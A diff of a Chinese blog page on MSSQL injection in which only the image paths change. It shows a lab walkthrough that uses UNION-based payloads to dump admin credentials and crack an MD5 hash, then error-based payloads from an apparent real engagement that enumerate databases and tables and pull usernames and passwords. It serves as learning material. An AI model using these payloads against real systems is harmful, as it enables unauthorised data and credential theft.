@@ -167,84 +167,84 @@
 </li>
 </ul>
 <h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>靶场地址:<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/SXlYMWZhSm15QzM1OGpyV21BR1p2QT09bW96aGUmozhe">SQL手工注入漏洞测试(Sql Server数据库)<em>SQL注入_在线靶场_墨者学院</em></a></p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209101901336.png" class title="image-20211209101901336">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209101901336.png" class title="image-20211209101901336">
 
 
 
 <p>靶场页面如下，显示一个管理系统登录页面</p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209102146559.png" class title="image-20211209102146559">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209102146559.png" class title="image-20211209102146559">
 
 
 
 <p>在尝试使用弱口令登录错误后，缓过来这个注入不应该在登录中。看到下面有个通知，点进去看到通过id值来获取页面，可能存在注入点，下面进行探测</p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209103101249.png" class title="image-20211209103101249">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209103101249.png" class title="image-20211209103101249">
 
 
 
 <p>通过两者构造不同判断出该id字段存在注入点</p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209103627865.png" class title="image-20211209103627865">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209103627865.png" class title="image-20211209103627865">
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209103601097.png" class>
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209103601097.png" class>
 
 
 
 <p>该注入点为数字型注入，先判断查询字段数进行查询(使用order by x)</p>
 <p>当字段为5时显示错误，则查询字段为4</p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209104844041.png" class title="image-20211209104844041">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209104844041.png" class title="image-20211209104844041">
 
 
 
 <p>我们判断可以使用联合注入进行查询，下面判断回显字段，返回第二个和第三个字段并且为字符型</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2%20union%20all%20select%20null,%272%27,%273%27,4</span><br></pre></td></tr></table></figure>
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209105701949.png" class title="image-20211209105701949">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209105701949.png" class title="image-20211209105701949">
 
 <p>确定回显字段后，在对应字段输入查询信息进行查询</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2%20union%20all%20select%20null,(@@version),(@@servername),4</span><br></pre></td></tr></table></figure>
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209110027614.png" class title="image-20211209110027614">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209110027614.png" class title="image-20211209110027614">
 
 
 
 <p>查询数据库名称和当前用户</p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209110409888.png" class title="image-20211209110409888">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209110409888.png" class title="image-20211209110409888">
 
 
 
 
 
 <p>爆数据库中数据表 </p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209112032551.png" class title="image-20211209112032551">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209112032551.png" class title="image-20211209112032551">
 
 <p>查询数据表中的列.这里通过col_name()函数获取对应数据表的第几个列名称</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2%20union%20all%20select%201,(select%20top%201%20col_name(object_id(%27manage%27),1)%20from%20sysobjects),%20%273%27,4</span><br></pre></td></tr></table></figure>
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209112946811.png" class title="image-20211209112946811">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209112946811.png" class title="image-20211209112946811">
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113059383.png" class title="image-20211209113059383">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113059383.png" class title="image-20211209113059383">
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113121041.png" class title="image-20211209113121041">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113121041.png" class title="image-20211209113121041">
 
 
 
 <p>查询获得的username和password列后，接着就去获取该字段值</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d=-2%20union%20all%20select%201,username,password,4%20from%20manage</span><br></pre></td></tr></table></figure>
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113324585.png" class title="image-20211209113324585">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113324585.png" class title="image-20211209113324585">
 
 <p>MD5解密获取明文密码</p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113424120.png" class title="image-20211209113424120">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113424120.png" class title="image-20211209113424120">
 
 
 
 <p>登录系统成功，获取flag</p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113522221.png" class title="image-20211209113522221">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113522221.png" class title="image-20211209113522221">
 
 
 
 <h2 id="项目实战"><a href="#项目实战" class="headerlink" title="项目实战"></a>项目实战</h2><p>下面对在项目中遇到的MSSQL注入进行记录学习。</p>
 <p>修改content字段为单引号，此时服务器报错显示引号不完整。可以判断该注入点为字符型注入。</p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208140003887.png" class title="image-20211208140003887">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208140003887.png" class title="image-20211208140003887">
 
 
 
@@ -252,27 +252,27 @@
 <h3 id="获取数据库版本"><a href="#获取数据库版本" class="headerlink" title="获取数据库版本"></a>获取数据库版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘%20and%201=(select%20@@version)--</span><br></pre></td></tr></table></figure>
 
 <p>可以在报错信息中看到数据库版本</p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208140631370.png" class title="image-20211208140631370">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208140631370.png" class title="image-20211208140631370">
 
 
 
 <h3 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘%20and%201=(select%20db_name())--</span><br></pre></td></tr></table></figure>
 
 <p>在报错信息中看到数据库名称</p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208140940039.png" class title="image-20211208140940039">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208140940039.png" class title="image-20211208140940039">
 
 
 
 <h3 id="获取运行服务器名称"><a href="#获取运行服务器名称" class="headerlink" title="获取运行服务器名称"></a>获取运行服务器名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘%20and%201=(select%20@@servername)--</span><br></pre></td></tr></table></figure>
 
 <p>在报错信息中看到服务器名称.</p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208141524584.png" class title="image-20211208141524584">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208141524584.png" class title="image-20211208141524584">
 
 
 
 <h3 id="获取用户数据库名称"><a href="#获取用户数据库名称" class="headerlink" title="获取用户数据库名称"></a>获取用户数据库名称</h3><h4 id="获取第一个用户数据库名称"><a href="#获取第一个用户数据库名称" class="headerlink" title="获取第一个用户数据库名称"></a>获取第一个用户数据库名称</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘%20and%201=(select%20top%201%20name%20from%20master..sysdatabases%20where%20dbid&gt;4)--</span><br></pre></td></tr></table></figure>
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208142347154.png" class title="image-20211208142347154">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208142347154.png" class title="image-20211208142347154">
 
 
 
@@ -285,13 +285,13 @@
 
 
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208142956055.png" class title="image-20211208142956055">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208142956055.png" class title="image-20211208142956055">
 
 <p>可以按照这样的方法来一个一个获取用户数据库名称</p>
 <h4 id="获取所有数据库名称"><a href="#获取所有数据库名称" class="headerlink" title="获取所有数据库名称"></a>获取所有数据库名称</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+1=(select%20name%20from%20master..sysdatabases%20for%20xml%20path)--</span><br></pre></td></tr></table></figure>
 
 <p>将查询结果以xml形式展示</p>
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208143508464.png" class title="image-20211208143508464">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208143508464.png" class title="image-20211208143508464">
 
 
 
@@ -304,31 +304,31 @@
 <p>我们也可以使用SQL注入中的常用的information_schema数据库进行查询 </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20table_name%20from%20information_schema.tables)--</span><br></pre></td></tr></table></figure>
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208144010998.png" class title="image-20211208144010998">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208144010998.png" class title="image-20211208144010998">
 
 
 
 <p>查询第二个数据表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20name%20from%20sysobjects%20where%20xtype=&#x27;u&#x27;%20and%20name!=&#x27;UsersInfoB&#x27;)--</span><br></pre></td></tr></table></figure>
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208145218103.png" class title="image-20211208145218103">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208145218103.png" class title="image-20211208145218103">
 
 <p>和上面逐一获取数据库一样，照着此法获取数据表名。</p>
 <h4 id="获取所有数据库名"><a href="#获取所有数据库名" class="headerlink" title="获取所有数据库名"></a>获取所有数据库名</h4><p>将查询结果以xml文件一起输出</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+1=(select%20name%20from%20sysobjects%20where%20xtype=&#x27;u&#x27;%20for%20xml%20path)--</span><br></pre></td></tr></table></figure>
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208144538119.png" class title="image-20211208144538119">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208144538119.png" class title="image-20211208144538119">
 
 
 
 <h3 id="获取数据库列名"><a href="#获取数据库列名" class="headerlink" title="获取数据库列名"></a>获取数据库列名</h3><h4 id="获取列名称"><a href="#获取列名称" class="headerlink" title="获取列名称"></a>获取列名称</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20name%20from%20syscolumns%20where%20id=(select%20id%20from%20sysobjects%20where%20name=&#x27;UsersInfoB&#x27;))--</span><br></pre></td></tr></table></figure>
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208153340533.png" class title="image-20211208153340533">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208153340533.png" class title="image-20211208153340533">
 
 <p>以此来依次获取列名，同上。</p>
 <h4 id="获取所有列名"><a href="#获取所有列名" class="headerlink" title="获取所有列名"></a>获取所有列名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+1=(select%20%20name%20from%20syscolumns%20where%20id=(select%20id%20from%20sysobjects%20where%20name=&#x27;UsersInfoB&#x27;)%20for%20xml%20path)--</span><br></pre></td></tr></table></figure>
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208153316387.png" class title="image-20211208153316387">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208153316387.png" class title="image-20211208153316387">
 
 
 
@@ -336,14 +336,14 @@
 <p>查询用户名称</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20Username%20from%20UsersInfoB%20where%20id=1)</span><br></pre></td></tr></table></figure>
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208155305278.png" class title="image-20211208155305278">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208155305278.png" class title="image-20211208155305278">
 
 
 
 <p>查询密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20Userpass%20from%20UsersInfoB%20where%20id=1)--</span><br></pre></td></tr></table></figure>
 
-<img src="/.com//12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208155402794.png" class title="image-20211208155402794">
+<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208155402794.png" class title="image-20211208155402794">
 
  
       <!-- reward -->
